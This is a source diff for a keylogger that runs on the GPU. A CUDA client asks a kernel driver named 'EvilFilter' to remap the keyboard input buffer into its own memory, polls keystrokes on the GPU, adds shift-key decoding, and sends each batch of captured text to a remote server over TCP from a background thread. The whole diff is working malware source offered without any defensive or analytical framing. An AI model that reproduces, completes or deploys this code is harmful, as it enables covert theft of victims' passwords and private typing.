@@ -25,7 +25,35 @@
 #define DEBUG 1
 //#define BUFFER_SIZE 8192
 #define BUFFER_SIZE 128
+VOID pauseForABit(WORD secondsDelay) {
 
+	printf("Waiting for %d seconds...", secondsDelay);
+	SYSTEMTIME systemTime;
+	GetSystemTime(&systemTime);
+	WORD ExitMinute = systemTime.wMinute;
+	WORD ExitSecond = systemTime.wSecond + secondsDelay;
+	while (ExitSecond > 59) {
+		ExitSecond = ExitSecond - 60;
+		ExitMinute = ExitMinute + 1;
+	}
+	while (ExitMinute > 59) {
+		ExitMinute = ExitMinute - 60;
+	}
+	WORD CurrentMinute = systemTime.wMinute;
+	WORD CurrentSecond = systemTime.wSecond;
+
+
+	while (TRUE) {
+		GetSystemTime(&systemTime);
+		CurrentMinute = systemTime.wMinute;
+		CurrentSecond = systemTime.wSecond;
+		if (CurrentMinute == ExitMinute && CurrentSecond >= ExitSecond) {
+			break;
+		}
+	}
+	printf("done waiting\n");
+	return;
+}
 __global__ void copyKeyboardBuffer(PCHAR inBuffer, PCHAR outBuffer, PULONG keystrokeIndex) {
 	int index = blockIdx.x*blockDim.x + threadIdx.x;
 	// TODO: encrypt keystroke here? XOR 0x65?
@@ -38,26 +66,31 @@ __global__ void copyKeyboardBuffer(PCHAR inBuffer, PCHAR outBuffer, PULONG keyst
 	*keystrokeIndex = 0;
 }
 
-__global__ void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData, PCHAR KeyMap, PCHAR cudaBuffer, PUSHORT lastMake, PUSHORT lastModifier, PULONG keystrokeIndex, PULONG previousState) {
+__global__ void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData, PKEYBOARD_INPUT_DATA keyboardFlag, PCHAR KeyMap, PCHAR ExtendedKeyMap, PCHAR cudaBuffer, PUSHORT lastMake, PUSHORT lastModifier, PUSHORT shiftStatus, PULONG keystrokeIndex, PULONG previousState) {
 	int index = blockIdx.x*blockDim.x + threadIdx.x;
 
 	if (index == 0) {
 
-		if (*lastMake != keyboardData->MakeCode || *lastModifier != keyboardData->Flags) { // keyboardData->MakeCode != 0
+		if (*lastMake != keyboardData->MakeCode || *lastModifier != keyboardFlag->Flags) {
 
 			if (*keystrokeIndex < BUFFER_SIZE) {
 				CHAR key = KeyMap[keyboardData->MakeCode];
-				if (key == INVALID) {
+				if (keyboardFlag->Flags == SP_KEY_MAKE || keyboardFlag->Flags == SP_KEY_BREAK) {
+
+				} 
+				else if (key == INVALID) {
 
 				}
 				else if (key == ENTER) {
-
+					cudaBuffer[(*keystrokeIndex)++] = '\n';
 				}
-				else if (key == LSHIFT) {
-
-				}
-				else if (key == RSHIFT) {
-
+				else if (key == LSHIFT || key == RSHIFT) {
+					if (keyboardFlag->Flags == KEY_MAKE) {
+						*shiftStatus = 1;
+					}
+					else if (keyboardFlag->Flags == KEY_BREAK) {
+						*shiftStatus = 0;
+					}
 				}
 				else if (key == CTRL) {
 
@@ -68,21 +101,29 @@ __global__ void logKeyboardData(PKEYBOARD_INPUT_DATA keyboardData, PCHAR KeyMap,
 				else if (key == SPACE) {
 					cudaBuffer[(*keystrokeIndex)++] = ' ';
 				}
+				else if (*shiftStatus == 0) {
+					cudaBuffer[(*keystrokeIndex)++] = KeyMap[keyboardData->MakeCode];
+				}
+				else if (*shiftStatus == 1) {
+					cudaBuffer[(*keystrokeIndex)++] = ExtendedKeyMap[keyboardData->MakeCode];
+				}
 				else {
 					cudaBuffer[(*keystrokeIndex)++] = KeyMap[keyboardData->MakeCode];
 				}
 			}
-			printf("GPU: %s SC:[0x%x] [%c] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx] [%lu]\n",
-				keyboardData->Flags == KEY_BREAK ? "Up  " : keyboardData->Flags == KEY_MAKE ? "Down" : "Unkn",
-				keyboardData->MakeCode,
+			printf("GPU: %s [%c][0x%x] unit[0x%x] flags[0x%x] res[0x%x] ext[0x%lx][0x%lx] index[%lu]\n",
+				keyboardFlag->Flags == KEY_BREAK ? "Up  " : keyboardFlag->Flags == KEY_MAKE ? "Down" : "Unkn",
 				KeyMap[keyboardData->MakeCode],
+				keyboardData->MakeCode,
 				keyboardData->UnitId,
-				keyboardData->Flags,
+				keyboardFlag->Flags,
 				keyboardData->Reserved,
-				keyboardData->ExtraInformation, *keystrokeIndex);
+				keyboardData->ExtraInformation,
+				keyboardFlag->ExtraInformation,
+				*keystrokeIndex);
 
 			*lastMake = keyboardData->MakeCode;
-			*lastModifier = keyboardData->Flags;
+			*lastModifier = keyboardFlag->Flags;
 				
 		}
 	}
@@ -110,140 +151,207 @@ int main(int argc, _TCHAR* argv[]) {
 	}
 	else {
 
-		PKEYBOARD_INPUT_DATA keyboardData;
+		PKEYBOARD_INPUT_DATA keyboardData = NULL;
+		PKEYBOARD_INPUT_DATA keyboardFlag = NULL;
+		PKEYBOARD_INPUT_DATA tempKeyboard;
 		PSHARED_MEMORY_STRUCT dataToTransmit;
-
-		keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
+		ULONG kmdfBufferOffset;
+		ULONG kmdfFlagOffset;
+		BOOLEAN largeBuffer;
+		BOOLEAN largeFlag;
+		ULONG keyboardOffset;
+		ULONG flagOffset;
+		PLLIST listNode;
+		
 		dataToTransmit = (PSHARED_MEMORY_STRUCT)malloc(SharedMemoryLength);
+
+		// Get the Keyboard Offset
 		dataToTransmit->instruction = 'O';
 		dataToTransmit->offset = 0;
 
 		// Get the Buffer Offset
 		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL)) {
 			printf("Ioctl to EvilFilter device (attempt to get offset) failed\n");
+			CloseHandle(hControlDevice);
+			return 1;
 		}
-		else {
-			ULONG kmdfOffset;
-			ULONG keyboardOffset;
-			PLLIST listNode;
+		kmdfBufferOffset = dataToTransmit->offset;
+		largeBuffer = dataToTransmit->largePage;
+		printf("Ioctl to EvilFilter device succeeded...KMDF offset is [0x%lx]\n", kmdfBufferOffset);
 
-			kmdfOffset = dataToTransmit->offset;
-			printf("Ioctl to EvilFilter device succeeded...KMDF offset is [0x%lx]\n", kmdfOffset);
-			keyboardOffset = (ULONG)keyboardData & 0x0fff;
-			if (dataToTransmit->largePage) {
-				keyboardOffset = (ULONG)keyboardData & 0x1fffff;
-			}
-			printf("keyboardData is [0x%lx] offset is [0x%lx].\n Trying to get pointer with 'correct' offset [0x%lx]\n", keyboardData, keyboardOffset, kmdfOffset);
-			// create a pointer with the correct offset
-			listNode = (PLLIST)malloc(sizeof(LLIST));
-			listNode->keyboardBuffer = keyboardData;
-			listNode->previous = NULL;
-			while (keyboardOffset != kmdfOffset) {
-				keyboardData = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
-				if (dataToTransmit->largePage) {
-					keyboardOffset = (ULONG)keyboardData & 0x1fffff;
-				}
-				else {
-					keyboardOffset = (ULONG)keyboardData & 0xfff;
-				}
-				PLLIST previousListNode = listNode;
-				listNode = (PLLIST)malloc(sizeof(LLIST));
-				listNode->keyboardBuffer = keyboardData;
-				listNode->previous = previousListNode;
-			}
+		// Get the Flag Offset
+		dataToTransmit->instruction = 'P';
+		dataToTransmit->offset = 0;
+		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL)) {
+			printf("Ioctl to EvilFilter device (attempt to get offset) failed\n");
+			CloseHandle(hControlDevice);
+			return 1;
+		}
+		kmdfFlagOffset = dataToTransmit->offset;
+		largeFlag = dataToTransmit->largePage;
+		printf("Ioctl to EvilFilter device succeeded...KMDF Flag offset is [0x%lx]\n", kmdfFlagOffset);
 
-			printf("keyboardData is [0x%lx] - freeing unused memory...\n", keyboardData);
-			while (listNode != NULL) {
-				PLLIST currentListNode = listNode;
-				listNode = listNode->previous;
-				if (currentListNode->keyboardBuffer != keyboardData) {
-					free(currentListNode->keyboardBuffer);
-				}
-				free(currentListNode);
-			}
-			dataToTransmit->ClientMemory = keyboardData;
-			dataToTransmit->instruction = 'E';
+		// create a pointer with the correct offset
+		listNode = (PLLIST)malloc(sizeof(LLIST));
+		listNode->keyboardBuffer = NULL;
+		listNode->previous = NULL;
 
-			// Get the Keyboard Buffer
-			if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL )) {
-				printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
+		while (!keyboardData || !keyboardFlag) {
+			tempKeyboard = (PKEYBOARD_INPUT_DATA)malloc(sizeof(KEYBOARD_INPUT_DATA));
+			if (largeBuffer) {
+				keyboardOffset = (ULONG)tempKeyboard & 0x1fffff;
 			}
 			else {
-				PKEYBOARD_INPUT_DATA d_KeyboardData;
-				PCHAR d_KeyMap;
-				PCHAR d_KeystrokeBuffer;
-				PCHAR d_OutgoingKeystrokeBuffer;
-				PUSHORT d_lastMake;
-				PUSHORT d_lastModifier;
-				PULONG d_keystrokeIndex;
-				PULONG d_keyboardState;
-				PULONG h_keystrokeIndex;
-				PULONG h_keyboardState;
-				PCHAR h_KeystrokeBuffer;
-				USHORT init0 = 666U;
-				ULONG init0long = 0LU;
-				ULONG init666long = 666LU;
-
-				printf("Ioctl to EvilFilter device succeeded - we now have the real keyboard buffer.  KeyboardData=[0x%lx]\n", keyboardData);
-				//send address to GPU
-
-				checkCudaErrors(cudaSetDevice(0));
-				checkCudaErrors(cudaSetDeviceFlags(cudaDeviceMapHost));
-
-				h_keystrokeIndex = (PULONG)malloc(sizeof(ULONG));
-				*h_keystrokeIndex = 0;
-				h_keyboardState = (PULONG)malloc(sizeof(ULONG));
-				*h_keyboardState = 0;
-				h_KeystrokeBuffer = (PCHAR)malloc(sizeof(CHAR) * BUFFER_SIZE);
-
-				printf("Allocating device variables...");
-				checkCudaErrors(cudaMalloc(&d_lastMake,                sizeof(USHORT)));
-				checkCudaErrors(cudaMalloc(&d_lastModifier,            sizeof(USHORT)));
-				checkCudaErrors(cudaMalloc(&d_keystrokeIndex,          sizeof(ULONG)));
-				checkCudaErrors(cudaMalloc(&d_keyboardState,           sizeof(ULONG)));
-				checkCudaErrors(cudaMalloc(&d_KeystrokeBuffer,         sizeof(CHAR) * BUFFER_SIZE));
-				checkCudaErrors(cudaMalloc(&d_OutgoingKeystrokeBuffer, sizeof(CHAR) * BUFFER_SIZE));
-				checkCudaErrors(cudaMalloc((void **)&d_KeyMap,         sizeof(char) * 84));
-				printf("Allocated\nZeroing out device variables...");
-				checkCudaErrors(cudaMemcpy(d_lastMake,       &init0,       sizeof(USHORT),    cudaMemcpyHostToDevice));
-				checkCudaErrors(cudaMemcpy(d_lastModifier,   &init0,       sizeof(USHORT),    cudaMemcpyHostToDevice));
-				checkCudaErrors(cudaMemcpy(d_keystrokeIndex, &init0long,   sizeof(ULONG),     cudaMemcpyHostToDevice));
-				checkCudaErrors(cudaMemcpy(d_keyboardState,  &init666long, sizeof(ULONG),     cudaMemcpyHostToDevice));
-				checkCudaErrors(cudaMemcpy(d_KeyMap,         KeyMap,       84 * sizeof(char), cudaMemcpyHostToDevice));	
-				printf("Done.\n");
-
-				printf("Registering KeyboardData for use by CUDA...\n");
-				checkCudaErrors(cudaHostRegister(keyboardData, 10 * sizeof(char), cudaHostRegisterMapped));
-				printf("getting device pointer for KeyboardData...\n");
-				checkCudaErrors(cudaHostGetDevicePointer((void **)&d_KeyboardData, (void *)keyboardData, 0));
-				// TODO: make last make code and last flag here and pass them back and forth to the CUDA kernel
-				printf("Launching CUDA process.\n");
-				dim3 grid(1);
-				dim3 block(1); 
-				while (TRUE) { 
-					logKeyboardData <<<1, 1 >>>(d_KeyboardData, d_KeyMap, d_KeystrokeBuffer, d_lastMake, d_lastModifier, d_keystrokeIndex, d_keyboardState);
-					checkCudaErrors(cudaDeviceSynchronize());
-
-					checkCudaErrors(cudaMemcpy(h_keystrokeIndex, d_keystrokeIndex, sizeof(ULONG), cudaMemcpyDeviceToHost));
-					if (*h_keystrokeIndex >= BUFFER_SIZE) {
-						printf("copying buffer.\n");
-						copyKeyboardBuffer <<<2, 64 >>>(d_KeystrokeBuffer, d_OutgoingKeystrokeBuffer, d_keystrokeIndex);
-						checkCudaErrors(cudaDeviceSynchronize());
-						checkCudaErrors(cudaMemcpy(h_KeystrokeBuffer, d_OutgoingKeystrokeBuffer, sizeof(CHAR) * BUFFER_SIZE, cudaMemcpyDeviceToHost));
-						printf("sending buffer.\n"); 
-						xmitBuffer(h_KeystrokeBuffer);
-					}
-				}
+				keyboardOffset = (ULONG)tempKeyboard & 0x0fff;
+			}
+			if (largeFlag) {
+				flagOffset = (ULONG)tempKeyboard & 0x1fffff;
+			}
+			else {
+				flagOffset = (ULONG)tempKeyboard & 0x0fff;
+			}
+			if (!keyboardData && keyboardOffset == kmdfBufferOffset) {
+				keyboardData = tempKeyboard;
+				printf("Found keyboardData [0x%lx]...", tempKeyboard);
+			}
+			else if (!keyboardFlag && flagOffset == kmdfFlagOffset) {
+				keyboardFlag = tempKeyboard;
+				printf("Found keyboardFlag [0x%lx]...", tempKeyboard);
+			}
+			else {
+				PLLIST previousListNode = listNode;
+				listNode = (PLLIST)malloc(sizeof(LLIST));
+				listNode->keyboardBuffer = tempKeyboard;
+				listNode->previous = previousListNode;
 			}
 		}
+
+		printf("freeing unused memory...\n", keyboardData, keyboardFlag);
+		while (listNode) {
+			PLLIST currentListNode = listNode;
+			listNode = listNode->previous;
+
+			if (currentListNode->keyboardBuffer) {
+				free(currentListNode->keyboardBuffer);
+			}
+			free(currentListNode);
+		}
+
+		// Get the Keyboard Buffer
+		printf("fetching the KeyboardBuffer...");
+		dataToTransmit->ClientMemory = keyboardData;
+		dataToTransmit->instruction = 'E';
+		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL )) {
+			printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
+			CloseHandle(hControlDevice);
+			return 1;
+		}
+		printf("got it!\n\n");
+
+		// Get the Keyboard Flag
+		printf("fetching the keyboardFlag...");
+		dataToTransmit->ClientMemory = keyboardFlag;
+		dataToTransmit->instruction = 'F';
+		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL)) {
+			printf("Ioctl to EvilFilter device failed - unable to remap PTE\n");
+			CloseHandle(hControlDevice);
+			return 1;
+		}
+		printf("\nIoctl to EvilFilter device succeeded - we now have the real keyboard buffer.  KeyboardData=[0x%lx]\n", keyboardData);
+
+		// now try to unhook the keyboard
+		/**/
+		dataToTransmit->instruction = 'U';
+		if (!DeviceIoControl(hControlDevice, IOCTL_CUSTOM_CODE, NULL, 0, dataToTransmit, SharedMemoryLength, &bytes, NULL)) {
+			printf("Ioctl to EvilFilter device failed - unable to unhook keyboard - but that's ok.\n");
+		}
 		CloseHandle(hControlDevice);
+		/**/
+
+
+		/* send address to GPU */
+		// set up GPU
+		PKEYBOARD_INPUT_DATA d_KeyboardData;
+		PKEYBOARD_INPUT_DATA d_KeyboardFlag;
+		PCHAR d_KeyMap;
+		PCHAR d_KeyMap2;
+		PCHAR d_KeystrokeBuffer;
+		PCHAR d_OutgoingKeystrokeBuffer;
+		PUSHORT d_lastMake;
+		PUSHORT d_lastModifier;
+		PUSHORT d_shiftStatus;
+		PULONG d_keystrokeIndex;
+		PULONG d_keyboardState;
+		PULONG h_keystrokeIndex;
+		PULONG h_keyboardState;
+		PCHAR h_KeystrokeBuffer;
+		USHORT init0 = 666U;
+		ULONG init0long = 0LU;
+		ULONG init666long = 666LU;
+
+		checkCudaErrors(cudaSetDevice(0));
+		checkCudaErrors(cudaSetDeviceFlags(cudaDeviceMapHost));
+
+		h_keystrokeIndex = (PULONG)malloc(sizeof(ULONG));
+		*h_keystrokeIndex = 0;
+		h_keyboardState = (PULONG)malloc(sizeof(ULONG));
+		*h_keyboardState = 0;
+		h_KeystrokeBuffer = (PCHAR)malloc(sizeof(CHAR) * BUFFER_SIZE);
+
+		printf("Allocating device variables...");
+		checkCudaErrors(cudaMalloc(&d_lastMake,                sizeof(USHORT)));
+		checkCudaErrors(cudaMalloc(&d_lastModifier,            sizeof(USHORT)));
+		checkCudaErrors(cudaMalloc(&d_shiftStatus,             sizeof(USHORT)));
+		checkCudaErrors(cudaMalloc(&d_keystrokeIndex,          sizeof(ULONG)));
+		checkCudaErrors(cudaMalloc(&d_keyboardState,           sizeof(ULONG)));
+		checkCudaErrors(cudaMalloc(&d_KeystrokeBuffer,         sizeof(CHAR) * BUFFER_SIZE));
+		checkCudaErrors(cudaMalloc(&d_OutgoingKeystrokeBuffer, sizeof(CHAR) * BUFFER_SIZE));
+		checkCudaErrors(cudaMalloc((void **)&d_KeyMap,         sizeof(char) * 84));
+		checkCudaErrors(cudaMalloc((void **)&d_KeyMap2,        sizeof(char) * 84));
+		printf("Allocated\nZeroing out device variables...");
+		checkCudaErrors(cudaMemcpy(d_lastMake,         &init0,         sizeof(USHORT),    cudaMemcpyHostToDevice));
+		checkCudaErrors(cudaMemcpy(d_lastModifier,     &init0,         sizeof(USHORT),    cudaMemcpyHostToDevice));
+		checkCudaErrors(cudaMemcpy(d_shiftStatus,      &init0,         sizeof(USHORT),    cudaMemcpyHostToDevice));
+		checkCudaErrors(cudaMemcpy(d_keystrokeIndex,   &init0long,     sizeof(ULONG),     cudaMemcpyHostToDevice));
+		checkCudaErrors(cudaMemcpy(d_keyboardState,    &init666long,   sizeof(ULONG),     cudaMemcpyHostToDevice));
+		checkCudaErrors(cudaMemcpy(d_KeyMap,           KeyMap,         84 * sizeof(char), cudaMemcpyHostToDevice));	
+		checkCudaErrors(cudaMemcpy(d_KeyMap2,          ExtendedKeyMap, 84 * sizeof(char), cudaMemcpyHostToDevice));	
+		printf("Done.\n");
+
+		printf("Registering KeyboardData for use by CUDA...\n");
+		checkCudaErrors(cudaHostRegister(keyboardData, sizeof(KEYBOARD_INPUT_DATA), cudaHostRegisterMapped));
+		checkCudaErrors(cudaHostRegister(keyboardFlag, sizeof(KEYBOARD_INPUT_DATA), cudaHostRegisterMapped));
+		printf("getting device pointer for KeyboardData...\n");
+		checkCudaErrors(cudaHostGetDevicePointer((void **)&d_KeyboardData, (void *)keyboardData, 0));
+		checkCudaErrors(cudaHostGetDevicePointer((void **)&d_KeyboardFlag, (void *)keyboardFlag, 0));
+
+		printf("Launching CUDA process.\n");
+		dim3 grid(1);
+		dim3 block(1); 
+		while (TRUE) { 
+			logKeyboardData <<<1, 1 >>>(d_KeyboardData, d_KeyboardFlag, d_KeyMap, d_KeyMap2, d_KeystrokeBuffer, d_lastMake, d_lastModifier, d_shiftStatus, d_keystrokeIndex, d_keyboardState);
+			checkCudaErrors(cudaDeviceSynchronize());
+
+			checkCudaErrors(cudaMemcpy(h_keystrokeIndex, d_keystrokeIndex, sizeof(ULONG), cudaMemcpyDeviceToHost));
+			if (*h_keystrokeIndex >= BUFFER_SIZE) {
+				printf("copying buffer.\n");
+				copyKeyboardBuffer <<<2, 64 >>>(d_KeystrokeBuffer, d_OutgoingKeystrokeBuffer, d_keystrokeIndex);
+				checkCudaErrors(cudaDeviceSynchronize());
+				checkCudaErrors(cudaMemcpy(h_KeystrokeBuffer, d_OutgoingKeystrokeBuffer, sizeof(CHAR) * BUFFER_SIZE, cudaMemcpyDeviceToHost));
+				printf("sending buffer.\n"); 
+
+				//LPVOID lpVoid = (LPVOID)h_KeystrokeBuffer;
+				CreateThread(NULL, 0, xmitBuffer, (LPVOID)h_KeystrokeBuffer, 0, NULL);
+				//xmitBuffer(h_KeystrokeBuffer);
+			}
+		}
 	}
 	return 0;
 }
 
 
 
-void xmitBuffer(char * echoString) {
+DWORD WINAPI xmitBuffer(LPVOID voidPointer) {
 	int sock;
 	struct sockaddr_in echoServAddr;
 	USHORT echoServPort = 7;
@@ -253,11 +361,11 @@ void xmitBuffer(char * echoString) {
 
 	if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0) {
 		fprintf(stderr, "WSAStartup() failed");
-		return;
+		return 1;
 	}
 	if ((sock = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
 		fprintf(stderr, "socket() failed");
-		return;
+		return 1;
 	}
 
 	memset(&echoServAddr, 0, sizeof(echoServAddr));
@@ -266,15 +374,15 @@ void xmitBuffer(char * echoString) {
 	echoServAddr.sin_port = htons(echoServPort);
 	if (connect(sock, (struct sockaddr *) &echoServAddr, sizeof(echoServAddr)) < 0) {
 		fprintf(stderr, "connect() failed");
-		return;
+		return 1;
 	}
-
+	PCHAR echoString = (PCHAR)voidPointer;
 	echoStringLen = strlen(echoString);
 	send(sock, echoString, echoStringLen, 0);
 	closesocket(sock);
 	WSACleanup();
 
-	return;
+	return 0;
 }
 
 
